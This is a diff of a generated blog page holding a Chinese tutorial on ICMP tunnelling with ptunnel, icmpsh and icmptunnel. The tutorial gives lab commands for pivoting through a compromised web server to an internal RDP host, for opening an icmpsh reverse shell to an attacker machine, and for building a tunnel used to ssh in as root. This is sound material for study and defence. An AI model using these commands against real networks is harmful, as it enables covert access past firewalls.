@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -468,88 +471,106 @@
 <p>因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p>
 <h2 id="2、建立-ICMP-隧道工具"><a href="#2、建立-ICMP-隧道工具" class="headerlink" title="2、建立 ICMP 隧道工具"></a>2、建立 ICMP 隧道工具</h2><p>用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等</p>
 <h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p>
-<pre><code>yum -y install byacc
+<pre class="line-numbers language-none"><code class="language-none">yum -y install byacc
 yum -y install flex bison
 
 #安装libpcap依赖库
-wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz
+wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.9.0.tar.gz
 tar -xzvf libpcap-1.9.0.tar.gz
 cd libpcap-1.9.0
-./configure
+.&#x2F;configure
 make &amp;&amp; make install
 
 #安装PingTunnel
-wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz
+wget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gz
 tar -xzvf PingTunnel-0.72.tar.gz
 cd PingTunnel
-make &amp;&amp; make install</code></pre>
+make &amp;&amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>ptunnel 常用命令介绍：</p>
-<pre><code>-p: 指定跳板服务器 IP 地址
+<pre class="line-numbers language-none"><code class="language-none">-p: 指定跳板服务器 IP 地址
 -lp: 监听本地 TCP 端口
 -da: 指定访问目标的内网 IP 地址
 -dp: 指定访问目标的端口
 -m: 设置隧道最大并发数
 -v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）
 -udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）
--x: 设置隧道密码，防止滥用（客户端和代理端必须相同）</code></pre>
+-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p>
-<pre><code>Kali 攻击机       172.16.214.6 (外网)
+<pre class="line-numbers language-none"><code class="language-none">Kali 攻击机       172.16.214.6 (外网)
 |
 |
 Linux Web 跳板机  172.16.214.5  (外网)
 |                192.168.7.5   (内网)
 |
 |
-Win RDP 目标机    192.168.7.110 (内网)</code></pre>
+Win RDP 目标机    192.168.7.110 (内网)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在 Kali 攻击机上执行以下命令</p>
-<pre><code>ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix</code></pre>
-<pre><code>-p  指定跳板机外网IP
+<pre class="line-numbers language-none"><code class="language-none">ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">-p  指定跳板机外网IP
 -lp 指定本机的监听端口
 -da 指定目标机的内网IP
 -dp 指定目标机的端口
--x 设置隧道密码</code></pre>
+-x 设置隧道密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在 Linux Web 跳板机上执行以下命令</p>
-<pre><code>ptunnel -x teamssix</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">ptunnel -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_14-46-46.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p>
-<pre><code>git clone https://github.com/inquisb/icmpsh.git #下载工具
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git #下载工具
 apt-get install python-impacket # 安装依赖，或者 pip2 install impacket
-sysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答</code></pre>
+sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  #关闭本地ICMP应答<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>icmpsh 常用命令介绍：</p>
-<pre><code>-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]
+<pre class="line-numbers language-none"><code class="language-none">-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]
 -d milliseconds    请求时间间隔（毫秒）
 -o milliseconds    响应超时时间（毫秒）
--s bytes           最大数据缓冲区大小（字节）</code></pre>
+-s bytes           最大数据缓冲区大小（字节）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p>
-<pre><code>攻击机 IP：172.16.214.6
-目标机 IP：172.16.214.2</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6
+目标机 IP：172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>在攻击机上运行：</p>
-<pre><code>python2 icmpsh_m.py 172.16.214.6 172.16.214.2</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python2 icmpsh_m.py 172.16.214.6 172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>在目标机上运行</p>
-<pre><code>./icmpsh.exe -t 172.16.214.6</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;icmpsh.exe -t 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_15-43-51.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p>
-<pre><code>git clone https://github.com/jamesbarlow/icmptunnel.git
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jamesbarlow&#x2F;icmptunnel.git
 cd icmptunnel
-make</code></pre>
+make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p>
-<pre><code>攻击机 IP：172.16.214.6
-目标机 IP：172.16.214.5</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6
+目标机 IP：172.16.214.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>在攻击机上运行：</p>
-<pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all        # 禁用 ICMP echo 回复，防止内核自己对ping包进行响应
-./icmptunnel -s    # 开启服务端模式</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all		# 禁用 ICMP echo 回复，防止内核自己对ping包进行响应
+.&#x2F;icmptunnel -s	# 开启服务端模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>在攻击机上新开启一个终端运行：</p>
-<pre><code>/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0	# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>在目标机上运行：</p>
-<pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all
-./icmptunnel 172.16.214.6</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all
+.&#x2F;icmptunnel 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>在目标机上新开启一个终端运行：</p>
-<pre><code>/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.2 netmask 255.255.255.0	# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>至此，已经通过 ICMP 建立了一个点对点隧道。</p>
 <p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p>
-<pre><code>ssh root@10.0.0.2</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">ssh root@10.0.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_16-35-09.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <blockquote>
 <p>参考链接：</p>
@@ -986,7 +1007,7 @@ make</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
